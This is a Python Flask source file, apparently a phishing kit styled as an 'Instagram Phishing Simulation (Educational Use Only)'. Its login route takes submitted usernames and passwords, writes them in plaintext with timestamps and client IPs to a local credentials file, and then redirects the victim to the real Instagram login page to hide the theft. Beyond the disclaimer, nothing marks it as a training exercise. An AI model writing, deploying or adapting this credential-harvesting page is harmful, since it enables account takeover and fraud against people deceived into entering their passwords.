from flask import Flask, render_template, request, redirect
import os
import datetime
import logging

# ==============================================================================
# Application: Instagram Phishing Simulation (Educational Use Only)
# Author: You
# ==============================================================================

# ------------------------------------------------------------------------------
# Section 1: Flask App Initialization
# ------------------------------------------------------------------------------

app = Flask(__name__)

# ------------------------------------------------------------------------------
# Section 2: Paths and Logging Configuration
# ------------------------------------------------------------------------------

# Paths for credential storage
CREDENTIALS_DIR = 'data'
CREDENTIALS_FILE_PATH = os.path.join(CREDENTIALS_DIR, 'user_credentials.txt')
LOG_FILE_PATH = os.path.join(CREDENTIALS_DIR, 'server.log')

# Create data directory if it doesn't exist
if not os.path.exists(CREDENTIALS_DIR):
    os.makedirs(CREDENTIALS_DIR)

# Configure logging
logging.basicConfig(
    filename=LOG_FILE_PATH,
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)

# ------------------------------------------------------------------------------
# Section 3: Helper Function to Save Credentials
# ------------------------------------------------------------------------------

def save_credentials(username: str, password: str, client_ip: str):
    """
    Save captured credentials with timestamp and IP address.
    """
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    log_entry = (
        "\n"
        "------------------------------------------------------------\n"
        f"🕒 Time     : {timestamp}\n"
        f"🌐 IP       : {client_ip}\n"
        f"👤 Username : {username}\n"
        f"🔐 Password : {password}\n"
        "------------------------------------------------------------\n"
    )

    try:
        with open(CREDENTIALS_FILE_PATH, 'a', encoding='utf-8') as file:
            file.write(log_entry)
        logging.info(f'Credentials saved for username: {username} from IP: {client_ip}')
    except Exception as e:
        logging.error(f'Failed to save credentials: {e}')

# ------------------------------------------------------------------------------
# Section 4: Main Route - Login Page
# ------------------------------------------------------------------------------

@app.route('/', methods=['GET', 'POST'])
def login():
    """
    Handle GET (render form) and POST (save credentials) requests.
    """
    if request.method == 'POST':
        # Extract user input
        username = request.form.get('username', '').strip()
        password = request.form.get('password', '').strip()

        # Simulate getting client IP (works locally as 127.0.0.1)
        client_ip = request.remote_addr

        # Save credentials
        save_credentials(username, password, client_ip)

        # Redirect to official Instagram login page
        return redirect('https://www.instagram.com/accounts/login/')

    # If GET request, render the login.html template
    return render_template('login.html')

# ------------------------------------------------------------------------------
# Section 5: Flask Entry Point
# ------------------------------------------------------------------------------

if __name__ == '__main__':
    print("\n============================================================")
    print("  ⚠️  WARNING: Development Server Running")
    print("  🔒 This should NOT be used in production.")
    print("------------------------------------------------------------")
    print("  🌐 Access it locally at: http://127.0.0.1:5000")
    print("============================================================\n")

    # Start the Flask development server
    app.run(
        host='127.0.0.1',
        port=5000,
        debug=True
    )
